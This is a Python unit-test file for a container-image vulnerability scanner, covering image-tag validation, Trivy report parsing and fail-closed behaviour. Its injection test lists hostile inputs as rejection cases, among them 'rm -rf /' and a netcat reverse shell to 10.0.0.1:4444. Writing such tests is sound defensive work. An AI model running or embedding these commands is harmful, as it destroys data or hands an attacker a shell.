"""
Unit Tests for Scanner Integration and Report Parsing
Uses mock data and fixtures to guarantee deterministic offline execution.
"""

import json
import pytest
from unittest.mock import patch, MagicMock
from scanner import ScannerService, ImageReferenceError, ScannerExecutionError

def test_image_reference_validation_valid():
    """Valid image tags pass validation."""
    valid_refs = [
        "secureship-demo:1.0",
        "myrepo/myimage:v2.3.1",
        "registry.local:5000/app:latest",
        "python:3.11-slim",
        "app:tag@sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ]
    for ref in valid_refs:
        assert ScannerService.validate_image_reference(ref) == ref

def test_image_reference_validation_rejects_injection():
    """Dangerous inputs with shell characters are rejected."""
    bad_refs = [
        "app; rm -rf /",
        "app && whoami",
        "app | nc -e /bin/sh 10.0.0.1 4444",
        "app`id`",
        "app$(whoami)",
        "app > file",
        "",
        "   ",
        "app with spaces"
    ]
    for bad in bad_refs:
        with pytest.raises(ImageReferenceError):
            ScannerService.validate_image_reference(bad)

def test_parse_trivy_report_valid(tmp_path):
    """Valid Trivy JSON report is correctly parsed with findings and counts."""
    report_file = tmp_path / "valid_report.json"
    sample_data = {
        "SchemaVersion": 2,
        "Metadata": {
            "ImageID": "sha256:112233445566",
            "RepoDigests": ["myapp@sha256:aabbccddeeff"]
        },
        "Results": [
            {
                "Target": "debian 12.0",
                "Vulnerabilities": [
                    {
                        "VulnerabilityID": "CVE-2023-1111",
                        "PkgName": "libssl3",
                        "InstalledVersion": "3.0.9-1",
                        "FixedVersion": "3.0.9-1+deb12u1",
                        "Severity": "CRITICAL",
                        "Title": "Buffer overflow in OpenSSL",
                        "Description": "Details about CVE-2023-1111",
                        "PrimaryURL": "https://cve.mitre.org"
                    },
                    {
                        "VulnerabilityID": "CVE-2023-2222",
                        "PkgName": "curl",
                        "InstalledVersion": "7.88.1",
                        "FixedVersion": "7.88.1-1",
                        "Severity": "HIGH",
                        "Title": "Cookie injection in curl",
                        "PrimaryURL": "https://curl.se"
                    },
                    {
                        "VulnerabilityID": "CVE-2023-3333",
                        "PkgName": "bash",
                        "InstalledVersion": "5.2.15",
                        "Severity": "LOW"
                    }
                ]
            }
        ]
    }
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(sample_data, f)

    counts, findings, digest, img_id = ScannerService.parse_trivy_report(str(report_file))
    assert counts["critical"] == 1
    assert counts["high"] == 1
    assert counts["low"] == 1
    assert counts["medium"] == 0
    assert counts["total"] == 3
    assert len(findings) == 3
    assert img_id == "sha256:112233445566"
    assert digest == "myapp@sha256:aabbccddeeff"

def test_parse_trivy_report_malformed_json_fails_closed(tmp_path):
    """Malformed JSON file raises ScannerExecutionError."""
    bad_file = tmp_path / "corrupted.json"
    with open(bad_file, "w") as f:
        f.write("{ invalid json content ...")

    with pytest.raises(ScannerExecutionError) as exc_info:
        ScannerService.parse_trivy_report(str(bad_file))
    assert "Invalid JSON" in str(exc_info.value)

def test_parse_trivy_report_empty_file_fails_closed(tmp_path):
    """Empty report file raises ScannerExecutionError."""
    empty_file = tmp_path / "empty.json"
    empty_file.touch()

    with pytest.raises(ScannerExecutionError):
        ScannerService.parse_trivy_report(str(empty_file))

@patch("scanner.ScannerService.get_trivy_version")
def test_missing_trivy_fails_closed(mock_trivy_ver):
    """When Trivy binary is not available, scan returns ERROR and is BLOCKED."""
    mock_trivy_ver.return_value = (False, "Trivy binary not found in system PATH.")
    
    result = ScannerService.scan_image("test-image:latest")
    assert result["status"] == "ERROR"
    assert result["policy_decision"] == "BLOCKED"
    assert "unavailable" in result["scanner_version"]
